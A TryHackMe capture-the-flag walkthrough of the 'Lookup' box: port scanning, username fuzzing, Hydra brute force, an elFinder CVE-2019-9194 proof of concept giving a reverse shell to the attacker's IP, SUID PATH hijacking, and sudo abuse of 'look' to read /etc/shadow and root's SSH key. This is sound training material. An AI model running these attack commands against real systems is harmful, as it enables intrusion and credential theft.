# Lookup

# Lookup - TryHackMe Walkthrough

## 🧩 Overview

- **Platform:** TryHackMe
- **Box Name:** Lookup
- **Difficulty:** Easy
- **Date Completed:** 16/07/2025
- **Summary:** Web login brute-force > PHP RCE via vulnerable elFinder > Privilege escalation to user through SUID PATH hijack > Root via sudo abuse of `look` to access SSH private key.

---

## 1. 🔍 Enumeration

### Port Scanning

```bash
nmap -p- --open -sS -n -T4 -vvv 10.10.102.13 -oN full_tcp_scan.txt
```

- Port 22: SSH
- Port 80: HTTP

Follow-up service scan:

```bash
nmap -p 22,80 -sC -sV -n -T4 -vvv 10.10.102.13 -oN targeted_scan.txt
```

- Port 22: OpenSSH 8.2p1 (Ubuntu 4ubuntu0.9)
- Port 80: Apache/2.4.41 (Ubuntu)

---

### Web Enumeration

The IP resolves as `lookup.thm`, which I added to `/etc/hosts`. Visiting the site shows a login form at `/index.php`.

I used `gobuster` to look for additional content:

```bash
gobuster dir -u <target ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50 -o gobuster_results.txt -k -r
```

Only `/index.php` appeared relevant.

---

### Login Portal Analysis

Using Burp Suite, I tested login responses. Submitting a known username (`admin`) and a dummy password gives:

```
Wrong password. Please try again.<br>Redirecting in 3 seconds.
```

Trying a non-existent username shows:

```
Wrong username or password. Please try again.<br>Redirecting in 3 seconds.
```

This difference in responses can be used to fuzz for valid usernames.

---

### Username Fuzzing (ffuf)

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -X POST \
     -u http://lookup.thm/login.php \
     -d 'username=FUZZ&password=REDACTED' \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fr "Wrong username or password"
```

🧠 **Learning:** Spent a long time trying to fuzz usernames with Hydra to no avail. Switched to `ffuf` and got results instantly.

- Valid username found: `jose`

---

### Password Bruteforce (Hydra)

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -f -V

```

- Credentials found: `jose:REDACTED`

---

## 2. 💥 Initial Foothold

After logging in, the portal revealed a file manager interface powered by **elFinder v2.1.47**, which is vulnerable to command injection (CVE-2019-9194).

Exploitation was done using this PoC:

https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce

```bash
python3 elfinder.py -t http://files.lookup.thm/elFinder/ -lh 10.9.0.89 -lp 4305
```

This gave a reverse shell as `www-data`.

---

## 3. 🚀 Privilege Escalation

### User Privilege Escalation – think

In `/home/think/`, `user.txt` was present but unreadable by `www-data`. Searching for SUID binaries revealed `/usr/sbin/pwm`.

```bash
strings pwm
```

The binary:

- Executes the `id` command.
- Parses the username from the output.
- Constructs a path: `/home/<username>/.passwords`
- Attempts to read that file.

Since `id` isn’t invoked with an absolute path, I performed PATH hijacking:

```bash
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Running `pwm` now reads the file `/home/think/.passwords`, which contained a long list of possible passwords.

Bruteforcing with Hydra:

```bash
hydra -l think -P lookup.txt ssh://10.10.102.13
```

- Valid credentials found: `think:REDACTED`
- User flag located at `/home/think/user.txt`

---

### Root Privileges – Sudo Abuse with `look`

Checking `sudo -l` revealed:

```bash
User think may run the following commands:
    (ALL) /usr/bin/look
```

According to GTFOBins, `look` can read files when passed an empty search string:

```bash
sudo look "" /etc/shadow
```

This revealed password hashes. While running a cracker, I also checked `/root/.ssh/id_rsa`:

```bash
sudo look "" /root/.ssh/id_rsa
```

Found a full private SSH key. Saved it, set correct permissions, and logged in as root:

```bash
ssh -i lookup_id root@10.10.87.108
```

Root flag retrieved from `/root/root.txt`.

---

## 📝 Key Learnings

- `ffuf` is significantly more effective for username fuzzing than Hydra in certain cases.
- PATH hijacking with custom scripts is a common vector in CTF-style privilege escalation.
- It’s worth checking SUID binaries with `strings` to infer logic and potential abuse paths.
- CVE research and GitHub PoCs can provide quick paths to initial access.
- GTFOBins is a powerful resource when enumerating sudo permissions.

---


## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `ffuf`
- `hydra`
- `netcat`
- `Burp Suite`
- `python3`
- `GTFOBins`
- `strings`, `chmod`, `export`, `sudo`

---

## ✅ Box Completed: Lookup

🎯 **Goal:** Demonstrated enumeration, exploitation, and both user and root privilege escalation paths using common tools and manual analysis.

📘 **Portfolio Note:** This was a great learning opportunity for chaining multiple low-privilege issues into a full box compromise and reinforces the importance of detail during enumeration.
